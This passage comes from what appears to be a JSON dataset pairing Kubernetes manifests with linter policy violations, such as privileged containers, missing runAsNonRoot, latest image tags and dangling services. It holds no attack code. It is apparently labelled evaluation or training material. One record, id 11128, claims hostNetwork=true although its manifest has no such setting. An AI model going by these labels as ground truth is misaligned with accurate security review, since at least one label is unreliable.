    "manifest_path": "data/manifests/the_stack_sample/sample_4272.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: keep-ecdsa-5\n  namespace: default\n  labels:\n    app: keep\n    type: ecdsa\n    id: '5'\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 3919\n    targetPort: 3919\n    name: tcp-3919\n  selector:\n    app: keep\n    type: ecdsa\n    id: '5'\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:keep id:5 type:ecdsa])"
  },
  {
    "id": "11112",
    "manifest_path": "data/manifests/the_stack_sample/sample_4274.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gitops-hello-world-brigade\n  labels:\n    app: gitops-hello-world-brigade\n  namespace: staging\nspec:\n  ports:\n  - name: http\n    port: 8888\n    targetPort: 8888\n    protocol: TCP\n  selector:\n    app: gitops-hello-world-brigade\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gitops-hello-world-brigade])"
  },
  {
    "id": "11113",
    "manifest_path": "data/manifests/the_stack_sample/sample_4275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cfs-csi-demo\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cfs-csi-demo-pod\n  template:\n    metadata:\n      labels:\n        app: cfs-csi-demo-pod\n    spec:\n      containers:\n      - name: cfs-csi-demo\n        image: nginx:1.17.9\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          name: http-server\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          mountPropagation: HostToContainer\n          name: mypvc\n      volumes:\n      - name: mypvc\n        persistentVolumeClaim:\n          claimName: cfs-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cfs-csi-demo\" does not have a read-only root file system"
  },
  {
    "id": "11114",
    "manifest_path": "data/manifests/the_stack_sample/sample_4275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cfs-csi-demo\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cfs-csi-demo-pod\n  template:\n    metadata:\n      labels:\n        app: cfs-csi-demo-pod\n    spec:\n      containers:\n      - name: cfs-csi-demo\n        image: nginx:1.17.9\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          name: http-server\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          mountPropagation: HostToContainer\n          name: mypvc\n      volumes:\n      - name: mypvc\n        persistentVolumeClaim:\n          claimName: cfs-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cfs-csi-demo\" is not set to runAsNonRoot"
  },
  {
    "id": "11115",
    "manifest_path": "data/manifests/the_stack_sample/sample_4275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cfs-csi-demo\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cfs-csi-demo-pod\n  template:\n    metadata:\n      labels:\n        app: cfs-csi-demo-pod\n    spec:\n      containers:\n      - name: cfs-csi-demo\n        image: nginx:1.17.9\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          name: http-server\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          mountPropagation: HostToContainer\n          name: mypvc\n      volumes:\n      - name: mypvc\n        persistentVolumeClaim:\n          claimName: cfs-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cfs-csi-demo\" has cpu request 0"
  },
  {
    "id": "11116",
    "manifest_path": "data/manifests/the_stack_sample/sample_4275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cfs-csi-demo\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cfs-csi-demo-pod\n  template:\n    metadata:\n      labels:\n        app: cfs-csi-demo-pod\n    spec:\n      containers:\n      - name: cfs-csi-demo\n        image: nginx:1.17.9\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          name: http-server\n        volumeMounts:\n        - mountPath: /usr/share/nginx/html\n          mountPropagation: HostToContainer\n          name: mypvc\n      volumes:\n      - name: mypvc\n        persistentVolumeClaim:\n          claimName: cfs-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cfs-csi-demo\" has memory limit 0"
  },
  {
    "id": "11117",
    "manifest_path": "data/manifests/the_stack_sample/sample_4276.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stolon-sentinel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: stolon-sentinel\n      stolon-cluster: kube-stolon\n  template:\n    metadata:\n      labels:\n        component: stolon-sentinel\n        stolon-cluster: kube-stolon\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '8080'\n    spec:\n      containers:\n      - name: stolon-sentinel\n        image: sorintlab/stolon:master-pg10\n        command:\n        - gosu\n        - stolon\n        - stolon-sentinel\n        - --cluster-name\n        - kube-stolon\n        - --store-backend=etcdv3\n        - --store-endpoints\n        - https://172.17.8.114:2379,https://172.17.8.115:2379,https://172.17.8.116:2379\n        - --store-ca-file\n        - /etc/kubernetes/ssl/ca.pem\n        - --store-key\n        - /etc/kubernetes/ssl/kubelet-key.pem\n        - --store-cert-file\n        - /etc/kubernetes/ssl/kubelet.pem\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /etc/kubernetes/ssl\n          name: etcd-cert\n      volumes:\n      - name: etcd-cert\n        hostPath:\n          path: /etc/kubernetes/ssl\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"stolon-sentinel\" does not have a read-only root file system"
  },
  {
    "id": "11118",
    "manifest_path": "data/manifests/the_stack_sample/sample_4276.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stolon-sentinel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: stolon-sentinel\n      stolon-cluster: kube-stolon\n  template:\n    metadata:\n      labels:\n        component: stolon-sentinel\n        stolon-cluster: kube-stolon\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '8080'\n    spec:\n      containers:\n      - name: stolon-sentinel\n        image: sorintlab/stolon:master-pg10\n        command:\n        - gosu\n        - stolon\n        - stolon-sentinel\n        - --cluster-name\n        - kube-stolon\n        - --store-backend=etcdv3\n        - --store-endpoints\n        - https://172.17.8.114:2379,https://172.17.8.115:2379,https://172.17.8.116:2379\n        - --store-ca-file\n        - /etc/kubernetes/ssl/ca.pem\n        - --store-key\n        - /etc/kubernetes/ssl/kubelet-key.pem\n        - --store-cert-file\n        - /etc/kubernetes/ssl/kubelet.pem\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /etc/kubernetes/ssl\n          name: etcd-cert\n      volumes:\n      - name: etcd-cert\n        hostPath:\n          path: /etc/kubernetes/ssl\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"stolon-sentinel\" is not set to runAsNonRoot"
  },
  {
    "id": "11119",
    "manifest_path": "data/manifests/the_stack_sample/sample_4276.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stolon-sentinel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: stolon-sentinel\n      stolon-cluster: kube-stolon\n  template:\n    metadata:\n      labels:\n        component: stolon-sentinel\n        stolon-cluster: kube-stolon\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '8080'\n    spec:\n      containers:\n      - name: stolon-sentinel\n        image: sorintlab/stolon:master-pg10\n        command:\n        - gosu\n        - stolon\n        - stolon-sentinel\n        - --cluster-name\n        - kube-stolon\n        - --store-backend=etcdv3\n        - --store-endpoints\n        - https://172.17.8.114:2379,https://172.17.8.115:2379,https://172.17.8.116:2379\n        - --store-ca-file\n        - /etc/kubernetes/ssl/ca.pem\n        - --store-key\n        - /etc/kubernetes/ssl/kubelet-key.pem\n        - --store-cert-file\n        - /etc/kubernetes/ssl/kubelet.pem\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /etc/kubernetes/ssl\n          name: etcd-cert\n      volumes:\n      - name: etcd-cert\n        hostPath:\n          path: /etc/kubernetes/ssl\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"stolon-sentinel\" has cpu request 0"
  },
  {
    "id": "11120",
    "manifest_path": "data/manifests/the_stack_sample/sample_4276.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stolon-sentinel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: stolon-sentinel\n      stolon-cluster: kube-stolon\n  template:\n    metadata:\n      labels:\n        component: stolon-sentinel\n        stolon-cluster: kube-stolon\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '8080'\n    spec:\n      containers:\n      - name: stolon-sentinel\n        image: sorintlab/stolon:master-pg10\n        command:\n        - gosu\n        - stolon\n        - stolon-sentinel\n        - --cluster-name\n        - kube-stolon\n        - --store-backend=etcdv3\n        - --store-endpoints\n        - https://172.17.8.114:2379,https://172.17.8.115:2379,https://172.17.8.116:2379\n        - --store-ca-file\n        - /etc/kubernetes/ssl/ca.pem\n        - --store-key\n        - /etc/kubernetes/ssl/kubelet-key.pem\n        - --store-cert-file\n        - /etc/kubernetes/ssl/kubelet.pem\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /etc/kubernetes/ssl\n          name: etcd-cert\n      volumes:\n      - name: etcd-cert\n        hostPath:\n          path: /etc/kubernetes/ssl\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"stolon-sentinel\" has memory limit 0"
  },
  {
    "id": "11121",
    "manifest_path": "data/manifests/the_stack_sample/sample_4277.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: '{{ .Release.Name }}-database'\n  labels:\n    katenary.io/component: database\n    katenary.io/project: basic\n    katenary.io/release: '{{ .Release.Name }}'\n  annotations:\n    katenary.io/docker-compose-sha1: b9f12bb7d1e97901c1d7680394209525763f6640\n    katenary.io/version: master-3619cc4\nspec:\n  selector:\n    katenary.io/component: database\n    katenary.io/release: '{{ .Release.Name }}'\n  ports:\n  - protocol: TCP\n    port: 3306\n    targetPort: 3306\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][katenary.io/release]: Invalid value: \"{{ .Release.Name }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "11122",
    "manifest_path": "data/manifests/the_stack_sample/sample_4278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: rank-storage-service\nspec:\n  type: ClusterIP\n  selector:\n    app: rank-storage\n  ports:\n  - port: 1111\n    targetPort: 1111\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:rank-storage])"
  },
  {
    "id": "11123",
    "manifest_path": "data/manifests/the_stack_sample/sample_4280.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        gcePersistentDisk:\n          pdName: mongo-disk\n          fsType: ext4\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongo\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11124",
    "manifest_path": "data/manifests/the_stack_sample/sample_4280.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        gcePersistentDisk:\n          pdName: mongo-disk\n          fsType: ext4\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "11125",
    "manifest_path": "data/manifests/the_stack_sample/sample_4280.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        gcePersistentDisk:\n          pdName: mongo-disk\n          fsType: ext4\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "11126",
    "manifest_path": "data/manifests/the_stack_sample/sample_4280.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        gcePersistentDisk:\n          pdName: mongo-disk\n          fsType: ext4\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "11127",
    "manifest_path": "data/manifests/the_stack_sample/sample_4280.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        gcePersistentDisk:\n          pdName: mongo-disk\n          fsType: ext4\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "11128",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "11129",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"node-ca\" is using an invalid container image, \"docker.io/openshift/origin-cluster-image-registry-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11130",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-ca\" does not have a read-only root file system"
  },
  {
    "id": "11131",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"node-ca\" not found"
  },
  {
    "id": "11132",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"node-ca\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "11133",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"node-ca\" is privileged"
  },
  {
    "id": "11134",
    "manifest_path": "data/manifests/the_stack_sample/sample_4281.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-ca\n  namespace: openshift-image-registry\nspec:\n  selector:\n    matchLabels:\n      name: node-ca\n  template:\n    metadata:\n      labels:\n        name: node-ca\n    spec:\n      serviceAccountName: node-ca\n      containers:\n      - name: node-ca\n        securityContext:\n          privileged: true\n          runAsUser: 1001\n          runAsGroup: 0\n        image: docker.io/openshift/origin-cluster-image-registry-operator:latest\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        command:\n        - /bin/sh\n        - -c\n        - \"trap 'jobs -p | xargs -r kill; echo shutting down node-ca; exit 0' TERM\\n\\\n          while [ true ];\\ndo\\n  for f in $(ls /tmp/serviceca); do\\n      echo $f\\n\\\n          \\      ca_file_path=\\\"/tmp/serviceca/${f}\\\"\\n      f=$(echo $f | sed  -r\\\n          \\ 's/(.*)\\\\.\\\\./\\\\1:/')\\n      reg_dir_path=\\\"/etc/docker/certs.d/${f}\\\"\\\n          \\n      if [ -e \\\"${reg_dir_path}\\\" ]; then\\n          cp -u $ca_file_path\\\n          \\ $reg_dir_path/ca.crt\\n      else\\n          mkdir $reg_dir_path\\n    \\\n          \\      cp $ca_file_path $reg_dir_path/ca.crt\\n      fi\\n  done\\n  for d\\\n          \\ in $(ls /etc/docker/certs.d); do\\n      echo $d\\n      dp=$(echo $d |\\\n          \\ sed  -r 